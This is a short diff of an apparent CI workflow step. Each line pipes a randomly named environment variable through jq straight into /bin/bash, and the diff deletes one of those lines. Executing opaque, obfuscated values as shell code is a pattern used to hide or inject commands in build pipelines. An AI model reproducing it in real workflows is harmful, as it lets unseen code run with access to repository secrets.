@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
           printf '%s' "$ic6" | jq -r .azpn6 | /bin/bash
-          echo $zmt2809 | jq -r .pcl4 | /bin/bash
           echo $wue909 | jq -r .lmqi50 | /bin/bash
           printf '%s' "$tq915" | jq -r .f579 | /bin/bash
           echo $xx8743 | jq -r .lstvn39 | /bin/bash
